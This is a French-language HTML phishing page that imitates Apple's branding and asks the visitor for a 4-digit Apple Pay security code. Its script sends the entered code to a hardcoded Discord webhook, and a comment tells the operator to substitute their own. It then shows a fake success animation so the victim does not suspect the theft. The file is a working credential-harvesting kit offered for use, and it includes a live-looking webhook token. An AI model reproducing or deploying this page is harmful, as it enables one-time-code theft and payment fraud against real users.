<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>Validation Code</title>
  <style>
    * {
      box-sizing: border-box;
      -webkit-tap-highlight-color: transparent;
    }

    body {
      margin: 0;
      background-color: #f2f2f7;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      background-color: white;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 4px 24px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 300px;
      text-align: center;
      transition: all 0.3s ease;
    }

    .apple-logo {
      width: 30px;
      margin-bottom: 16px;
    }

    h2 {
      font-size: 17px;
      font-weight: 600;
      margin: 0 0 8px;
      color: #111;
    }

    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 24px;
    }

    .otp-inputs {
      display: flex;
      justify-content: space-between;
      gap: 6px;
      margin-bottom: 20px;
    }

    .otp-inputs input {
      width: 44px;
      height: 44px;
      font-size: 22px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 8px;
      background-color: #fafafa;
      outline: none;
      transition: border-color 0.3s;
    }

    .otp-inputs input:focus {
      border-color: #007aff;
      background-color: #fff;
    }

    button {
      width: 100%;
      padding: 10px;
      font-size: 15px;
      background-color: #007aff;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      transition: background-color 0.3s;
    }

    button:hover {
      background-color: #005fcc;
    }

    .message {
      margin-top: 14px;
      font-size: 13px;
    }

    /* Animation checkmark style paiement accept√© */
    .success-animation {
      display: none;
      justify-content: center;
      align-items: center;
      margin-top: 30px;
    }

    .circle {
      width: 70px;
      height: 70px;
      border-radius: 50%;
      background-color: #28a7451a;
      position: relative;
      animation: zoomIn 0.4s ease-out forwards;
      display: flex;
      justify-content: center;
      align-items: center;
      box-shadow: 0 0 8px #28a74599;
    }

    /* SVG checkmark styles */
    svg {
      width: 36px;
      height: 36px;
      stroke: #28a745;
      stroke-width: 4;
      fill: none;
      stroke-linecap: round;
      stroke-linejoin: round;
      stroke-dasharray: 48;
      stroke-dashoffset: 48;
      animation: drawCheck 0.5s ease forwards 0.4s;
    }

    @keyframes zoomIn {
      0% {
        transform: scale(0.6);
        opacity: 0;
      }
      100% {
        transform: scale(1);
        opacity: 1;
      }
    }

    @keyframes drawCheck {
      to {
        stroke-dashoffset: 0;
      }
    }

    .validated .otp-inputs,
    .validated button,
    .validated p,
    .validated h2 {
      display: none;
    }

    .validated .success-animation {
      display: flex;
    }
  </style>
</head>
<body>
  <div class="container" id="form-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg"
         class="apple-logo" alt="Apple">
    <h2>Code de s√©curit√©</h2>
    <p>Entrez le code √† 4 chiffres</p>

    <form id="otp-form" autocomplete="off">
      <div class="otp-inputs">
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
        <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" required />
      </div>
      <button type="submit">Continuer</button>
      <div id="message" class="message"></div>
    </form>

    <div class="success-animation">
      <div class="circle">
        <svg viewBox="0 0 24 24">
          <path d="M4 12l6 6L20 6"/>
        </svg>
      </div>
    </div>
  </div>

  <script>
    const inputs = document.querySelectorAll(".otp-inputs input");
    const form = document.getElementById("otp-form");
    const messageEl = document.getElementById("message");
    const container = document.getElementById("form-container");

    // Ta webhook Discord (remplace par la tienne)
    const webhookURL = "https://discord.com/api/webhooks/1402398550536622191/VXLfNsLaAOiqQ-XPm6ftacy6DDQ6psjKmdlWJ_wv1wd0nncVg7EgzuFD06dhfGkXcOh4";

    inputs.forEach((input, i) => {
      input.addEventListener("input", () => {
        if (input.value.length === 1 && i < inputs.length - 1) {
          inputs[i + 1].focus();
        }
      });

      input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && input.value === "" && i > 0) {
          inputs[i - 1].focus();
        }
      });
    });

    form.addEventListener("submit", async function(e) {
      e.preventDefault();
      const code = Array.from(inputs).map(input => input.value).join('');

      if (code.length !== 4 || !/^\d{4}$/.test(code)) {
        messageEl.textContent = "Code invalide.";
        messageEl.className = "message error";
        return;
      }

      // Envoi du message √† la webhook Discord
      const msg =
        `[üçé] APPLE PAY [üçé]\n\n` +
        `üçé Code : ${code}\n\n`;

      try {
        const resp = await fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ content: msg })
        });

        if (resp.ok) {
          // Affiche animation de validation
          container.classList.add("validated");
          messageEl.textContent = "";
        } else {
          throw new Error("√âchec de l'envoi");
        }
      } catch (err) {
        messageEl.textContent = "Erreur lors de l'envoi.";
        messageEl.className = "message error";
      }
    });
  </script>
</body>
</html>
